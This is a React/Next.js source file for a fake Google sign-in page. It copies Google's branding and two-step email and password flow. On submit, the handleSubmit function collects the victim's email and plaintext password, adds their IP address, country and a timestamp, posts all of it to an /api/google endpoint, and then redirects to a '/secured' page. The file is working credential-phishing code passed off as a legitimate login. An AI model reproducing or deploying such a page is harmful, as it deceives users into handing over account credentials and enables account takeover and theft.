"use client";
import Footer from "@/components/Footer";
import GoogleLogoSvg from "@/components/GoogleLogoSvg";
import PersonSvg from "@/components/PersonSvg";
import { getUserLocation } from "@/utils/request";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { toast } from "react-toastify";

const getFormatedDateTime = (date) => {
  date = new Date(date);
  const formattedDate = date.toLocaleDateString("en-US", {
    year: "numeric",
    month: "short",
    day: "numeric",
  });

  const formattedTime = date.toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "numeric",
    hour12: true,
  });

  const formattedDateTime = `${formattedDate} ${formattedTime}`;
  return formattedDateTime;
};

export default function Home() {
  const [page, setPage] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const validateEmail = (email) => {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(email);
  };

  const handleNext = (e) => {
    e.preventDefault();
    const isValidEmail = validateEmail(email);
    if (!isValidEmail) {
      toast("Please enter a valid email address", { type: "error" });
      return;
    } else {
      setPage((prev) => prev + 1);
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    getUserLocation()
      .then(
        async (data) =>
          await fetch("/api/google", {
            method: "POST",
            body: JSON.stringify({
              email,
              password,
              date: getFormatedDateTime(new Date()),
              ip_address: data.ip,
              country: data.country_name,
            }),
          })
      )
      .finally(() => {
        setLoading(false);
        router.push("/secured");
      });
  };

  return (
    <div className="container">
      <section className="signin">
        <div className="logo">
          <GoogleLogoSvg />
        </div>

        <div className="flex-container">
          <div className="left">
            <h1>{page > 1 ? "Welcome" : "Sign in"}</h1>

            {page > 1 ? (
              <div className="user-container">
                <div className="user">
                  <PersonSvg />
                  <div className="email">{email}</div>
                </div>
              </div>
            ) : (
              <p>
                with your Google Account. This account will be available to
                other Google apps in the browser.
              </p>
            )}
          </div>
          <form className="right">
            {page > 1 && (
              <div className="verify-container">
                <p>To continue, first verify it’s you</p>
              </div>
            )}
            <div className="input-container">
              {page > 1 ? (
                <input
                  type={`${showPassword ? "text" : "password"}`}
                  placeholder="Enter your password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              ) : (
                <input
                  type="email"
                  placeholder="Email or phone"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              )}
            </div>
            {page > 1 ? (
              <div
                className="checkbox-container"
                onClick={() => setShowPassword((prev) => !prev)}
              >
                <input type="checkbox" id="showPassword" />
                <label
                  onClick={() => setShowPassword((prev) => !prev)}
                  htmlFor="showPassword"
                >
                  Show Password
                </label>
              </div>
            ) : (
              <a href="">Forgot email?</a>
            )}

            {page === 1 && (
              <div className="privacy-container">
                <p>
                  Not your computer? Use Guest mode to sign in privately.{" "}
                  <a href="">Learn more about using Guest mode</a>
                </p>
              </div>
            )}
            <div className="button-container">
              {page > 1 ? (
                <a href="">Forget password?</a>
              ) : (
                <a href="">Create account</a>
              )}

              {page > 1 ? (
                <button onClick={handleSubmit} type="submit" disabled={loading}>
                  Secure
                  {loading && (
                    <Image
                      src="/loader.svg"
                      alt="loader"
                      width={24}
                      height={24}
                      className="ml-2 animate-spin"
                    />
                  )}
                </button>
              ) : (
                <button onClick={handleNext} type="submit">
                  Next
                </button>
              )}
            </div>
          </form>
        </div>
      </section>
      <Footer />
    </div>
  );
}
